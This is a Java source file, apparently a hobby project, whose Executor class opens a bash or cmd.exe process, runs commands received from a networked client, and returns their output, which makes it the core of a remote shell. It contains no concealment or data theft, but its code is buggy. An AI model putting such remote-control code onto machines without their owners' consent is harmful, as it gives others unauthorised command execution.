import java.io.*;
import java.util.Arrays;

/**
 * Created by obada on 2016-10-27.
 */
 class Executor {

    private File tmp;
    private FileInputStream input;
    private Process p;

    /*
    properties[0] is OS
    properties[1] is the CWD
     */
    Executor(String[] properties,Client client)
    {
        String p1,p2,path;
        //check if it's windows, linux...etc
        if(properties[0].charAt(0)=='L'){p1="bash";p2="-C";path="/tmp";}
        //currently having problem with linux where I can't use cd commands, but I browse directories using ls -l path
        else {p1="cmd.exe";p2="/k";path="C:/users/"+System.getProperty("user.name");}
        //open up a process
        ProcessBuilder pb = new ProcessBuilder(p1, p2);
        //Shell dir
        pb.directory(new File(properties[1]));
        //write all output/error output to this file
        tmp = new File(path+"/tmp.txt");
        if(!tmp.exists()) try {
            tmp.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //redirect process output to tmp
        pb.redirectOutput(tmp);
        //redirect process output to tmp
        pb.redirectError(tmp);
        p = null;
        byte[] bytes;
        byte[] buffer = new byte[1024];
        int count;
        try {
            p = pb.start();
            input = new FileInputStream(tmp);
        } catch (Exception e) {
            e.printStackTrace();
        }
        String str="";
        try(PrintWriter pw = new PrintWriter(new OutputStreamWriter(p.getOutputStream()), true))
        {
            //notify the client
            client.sendMsg("Shell started >");
            //read commands from user
            while(!(str=client.getRequest()).equals("close"))
            {
                //if we wanna cd and the OS is linux
                if(str.contains("cd") && properties[0].charAt(0)=='L')
                    throw(new Exception("CAN'T CD ON LINUX"));
                pw.println(str);
                //wait for the process to write to tmp
                Thread.sleep(300);
                count = input.read(buffer);
                bytes = Arrays.copyOfRange(buffer,0,count);
                //write tmp to client
                client.sendMsg(new String(bytes));
            }
          // connection and Thread catches
        } catch (InterruptedException | IOException e) {
            try {
                close();
            } catch (InterruptedException | IOException e1) {
                e1.printStackTrace();
            }
        } catch (Exception e) {
            String cwd=str.substring(3,str.length());;
            // Destroy the current process
            try {
                close();
                //update the CWD
                properties[1] = cwd;
                //start a new process with the updated CWD
                new Executor(properties,client);
            } catch (InterruptedException | IOException e1) {
                e1.printStackTrace();
            }
        }
        try {
            close();
            //catch statemnet for close() only
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }

    }
    private void close() throws InterruptedException, IOException {
        //this will make main thread wait till process (console) will finish (will be closed)
        p.waitFor();
        //close input stream
        input.close();
        //delete the dir
        tmp.delete();
    }
}
